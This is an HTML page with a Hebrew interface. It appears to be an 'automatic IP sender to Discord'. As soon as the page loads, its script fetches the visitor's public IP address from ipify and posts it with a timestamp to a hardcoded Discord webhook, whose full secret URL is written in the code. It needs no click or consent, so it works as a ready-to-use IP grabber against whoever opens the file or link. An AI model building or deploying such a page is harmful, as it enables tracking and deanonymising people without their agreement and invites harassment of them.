<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>שולח IP אוטומטי לדיסקורד</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0f0f1a;
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1a1a2e;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 450px;
            width: 100%;
            border: 1px solid #3f3f5f;
        }
        h1 {
            font-size: 22px;
            margin-bottom: 20px;
            color: #7289da;
        }
        .status-box {
            font-size: 16px;
            padding: 15px;
            border-radius: 6px;
            background-color: #111122;
            font-weight: bold;
            color: #f1c40f;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>שולח IP אוטומטי</h1>
    <div id="status" class="status-box">מתחיל תהליך אוטומטי...</div>
</div>

<script>
    // ה-Webhook שלך מוטמע ישירות בקוד בצורה קבועה
    const webhookUrl = "https://discord.com/api/webhooks/1518529754733482154/X4wZUels4iUnIe45do7Oj7f_WRa6KE44jglWChQG4w6RCbjydX9Ec2PmmtkVCJP6_mVS";

    function updateStatus(text, color) {
        const statusDiv = document.getElementById('status');
        statusDiv.textContent = text;
        if(color) statusDiv.style.color = color;
    }

    async function sendToDiscord() {
        updateStatus("מזהה את כתובת ה-IP הציבורית...", "#f1c40f");

        try {
            // שליפת ה-IP הציבורי של מי שנכנס לדף
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const currentIp = ipData.ip;

            updateStatus(`ה-IP זוהה (${currentIp}). שולח לדיסקורד...`, "#f1c40f");

            // בניית האמבד לדיסקורד
            const discordPayload = {
                username: "שולח IP אוטומטי",
                embeds: [{
                    title: "🌐 כתובת IP חדשה התקבלה",
                    color: 7506394,
                    fields: [
                        {
                            name: "כתובת IP:",
                            value: `\`\`\`${currentIp}\`\`\``,
                            inline: false
                        },
                        {
                            name: "זמן כניסה:",
                            value: new Date().toLocaleString('he-IL'),
                            inline: true
                        }
                    ],
                    footer: {
                        text: "נשלח אוטומטית מיד עם פתיחת הקובץ"
                    }
                }]
            };

            // שליחה ישירה לדיסקורד
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

            if (response.ok) {
                updateStatus("ה-IP נשלח בהצלחה! אפשר לסגור את הכרטיסייה.", "#2ecc71");
            } else {
                updateStatus("שגיאה בשליחה לדיסקורד. ודא שה-Webhook תקין.", "#e74c3c");
            }

        } catch (error) {
            updateStatus("תקלה בתקשורת (בדיקת ה-IP או השליחה נכשלה).", "#e74c3c");
            console.error(error);
        }
    }

    // הפעלה מיידית ואוטומטית ברגע שהדף נטען, בלי שום לחיצה או הגדרה
    window.onload = sendToDiscord;
</script>

</body>
</html>
